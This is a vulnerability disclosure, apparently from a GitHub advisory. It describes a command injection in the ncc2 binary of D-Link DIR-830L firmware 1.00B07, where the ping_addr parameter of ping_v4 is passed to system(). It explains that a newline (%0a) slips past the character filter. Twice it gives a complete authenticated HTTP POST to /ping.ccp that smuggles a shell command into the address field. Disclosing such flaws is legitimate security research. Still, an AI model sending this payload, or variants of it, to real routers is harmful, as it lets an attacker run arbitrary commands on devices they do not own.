# Summary
There is a command injection vulnerability in `ncc2` binary file of D-Link DIR830LA1_FW100B07, which can lead to arbitrary command execution.

Fimware download link : https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/DIR-830L_REVA_FIRMWARE_1.00B07.ZIP

Affected component is `ping_v4`, which is `sub_4A4594` decompiled by IDA.

# Details
The same as `cancelPing`, `ping_v4` is also called in `callback_ccp_ping`:
![image](https://github.com/user-attachments/assets/9aef38f1-9a11-423e-91dd-e950a0cd7ce1)

Audit function `sub_4A4594`, parameter `ip_addr` is from front-end and is user controllable:
![image](https://github.com/user-attachments/assets/e775fa35-2171-43b7-b3dc-8848b48e36ef)

It will eventually be spliced into the parameters of `_system` function:
![image](https://github.com/user-attachments/assets/f4413d63-1d56-4d11-9d06-000c64044f58)

Although `ip_addr` is filtered previously, 
- \`
- \'
- \\
- ;

we can bypass it by using `%0a`:
```
ip_addr=127.0.0.1%0als />/www/poc1.html
```

Inadequate filter of parameter `ip_addr` leads to command injection vulnerability.

PoC:
(**Login** first to get your cookie)
```html
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.1/info/Login.html

Connection: close

Cookie: uid=SN5icKpv49

Upgrade-Insecure-Requests: 1

If-Modified-Since: Fri, 07 Nov 2014 06:35:31 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 58



ccp_act=ping_v4&&ping_addr=127.0.0.1%0als />/www/poc1.html
```
![image](https://github.com/user-attachments/assets/3fa2a205-1585-4ab0-93b9-da477fd665c1)

After sending payload, visit `/poc1.html` to see the result of command execution:
![image](https://github.com/user-attachments/assets/00fdadc8-36df-43ca-993b-25d547fe7e39)


# PoC
(**Login** first to get your cookie)
```html
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.1/info/Login.html

Connection: close

Cookie: uid=SN5icKpv49

Upgrade-Insecure-Requests: 1

If-Modified-Since: Fri, 07 Nov 2014 06:35:31 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 58



ccp_act=ping_v4&&ping_addr=127.0.0.1%0als />/www/poc1.html
```
![image](https://github.com/user-attachments/assets/3fa2a205-1585-4ab0-93b9-da477fd665c1)

![image](https://github.com/user-attachments/assets/00fdadc8-36df-43ca-993b-25d547fe7e39)
